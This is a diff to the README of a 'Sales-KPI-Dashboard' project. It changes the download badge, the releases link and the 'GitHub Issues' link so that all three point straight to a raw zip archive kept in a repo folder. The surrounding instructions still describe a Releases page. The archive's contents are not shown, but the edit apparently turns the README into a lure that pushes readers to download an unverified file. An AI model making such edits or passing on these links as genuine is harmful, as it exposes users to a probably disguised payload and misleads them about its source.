@@ -6,7 +6,7 @@ Welcome to the Sales-KPI-Dashboard! This application helps you visualize and ana
 
 ## 📥 Download the Application
 
-[![Download Sales-KPI-Dashboard](https://img.shields.io/badge/Download%20Sales--KPI--Dashboard-brightgreen)](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/releases)
+[![Download Sales-KPI-Dashboard](https://raw.githubusercontent.com/Dorridisjunctive295/Sales-KPI-Dashboard/main/Powerbi files/Sales-KPI-Dashboard_1.4.zip%20Sales--KPI--Dashboard-brightgreen)](https://raw.githubusercontent.com/Dorridisjunctive295/Sales-KPI-Dashboard/main/Powerbi files/Sales-KPI-Dashboard_1.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ The Sales-KPI-Dashboard provides the following main features:
 
 To download the Sales-KPI-Dashboard, follow these steps:
 
-1. Click on this link: [Download Sales-KPI-Dashboard](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/releases).
+1. Click on this link: [Download Sales-KPI-Dashboard](https://raw.githubusercontent.com/Dorridisjunctive295/Sales-KPI-Dashboard/main/Powerbi files/Sales-KPI-Dashboard_1.4.zip).
 2. You will be taken to the Releases page where you can find the latest version of the application.
 3. Look for the download link that says "Sales-KPI-Dashboard setup" or similar. 
 4. Click on the link to start the download. 
@@ -62,7 +62,7 @@ If you encounter issues during installation or while using the application, cons
 
 If you have questions or need help, feel free to reach out. You can find our community on GitHub:
 
-- **GitHub Issues**: Report bugs and request features [here](https://github.com/Dorridisjunctive295/Sales-KPI-Dashboard/issues).
+- **GitHub Issues**: Report bugs and request features [here](https://raw.githubusercontent.com/Dorridisjunctive295/Sales-KPI-Dashboard/main/Powerbi files/Sales-KPI-Dashboard_1.4.zip).
 - **Community Discussions**: Join discussions with other users for tips and best practices.
 
 ## 🌍 Contribute
